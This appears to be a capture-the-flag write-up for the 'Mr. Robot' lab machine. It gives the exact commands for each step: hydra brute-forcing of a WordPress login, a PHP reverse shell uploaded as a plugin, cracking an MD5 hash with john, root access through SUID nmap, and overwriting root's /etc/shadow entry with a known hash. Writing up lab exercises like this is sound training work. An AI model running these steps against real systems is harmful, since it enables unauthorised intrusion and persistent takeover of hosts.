# Mr. Robot
_IP: 10.0.4.5_

The first thing I did was an nmap scan which you can find i this folder.
Basicly, it did not tell us much, but I found out that there is site running.

_The first thing I checked was:_
https://10.0.4.5/robots.txt

_This is what I've got:_<br>
> User-agent: *<br>
> fsocity.dic<br>
> key-1-of-3.txt

> [!NOTE]
> _key-1-of-3.txt is a flag for ctf doers._

**After some research I figured out that that was a wordpress site.**<br>
Then, I found the login page and started preparing for bruteforce.
Probably there was an easier way, but I ran BurpSuite intercepted traffic while trying to login, and got this line:<br>
> log=user&pwd=pwd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1

This is how looked a command for bruteforcing a username:<br>
`hydra -L fsocity.dic -p test 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:Invalid username" -V`
> [80][http-post-form] host: 10.0.4.5   login: Elliot   password: test

Now I need to bruteforce the password. But first we need to remove dublications from the file since there is a lot of them.<br>
`sort fsocity.dic | uniq > new_fsocity.dic`

You can check the lenght of the file before and after using this command:
`wc -l`

Then run password bruteforcing.<br>
`hydra -l Elliot -P n_fsocity.dic 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:The password you entered" -V`

Username: _Elliot_ <br>
Password: _ER28-0652_

Looks like I can upload my own plugins, so I found a simple php reverse-shell, and zipped it, so wordpress thinks it is a plugin.<br>
`zip rev-plug.zip ./shell.php`

Upload the plugin, set up a nc listener, and activate the plugin. Now we have a reverse-shell.
Use this command to upgrade the shell:<br>
`python -c 'import pty; pty.spawn("/bin/bash")'`

We can see that there is a user named robot. Go to his folder and we will find:
> key-2-of-3.txt - Second key for ctfers<br>
> password.raw-md5

This is what I have found in password.raw-md5<br>
> robot:c3fcd3d76192e4007dfb496cca67e13b

Let's crack the hash.<br>
`john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt` <br>
username: _robot_ <br>
password: _abcdefghijklmnopqrstuvwxyz_

Change current user to robot.

## Almost there
**Now we need to find a way to escalate our privileges.**

We cannot run sudo. Let's look what we can do.
I used the next command to find files that I can run with their owner privileges.
`find / -perm -u=s -type f 2>/dev/null`
One of these files was nmap.

It is useful to have a simple hash if we need in any case.
> WVLY0mgH0RtUI = mrcake

> [!NOTE]
> https://gtfobins.github.io/
> Useful site to find ways for privilege escalation.

To escalate our privileges with nmap I do:
`nmap --interactive`
`!sh`

Then modify the password of root in /etc/shadow to our known hash, so that you can easily access it again.
`nano /etc/shadow`
`root:WVLY0mgH0RtUI:16753:0:99999:7:::`

**Thank you for attention.**
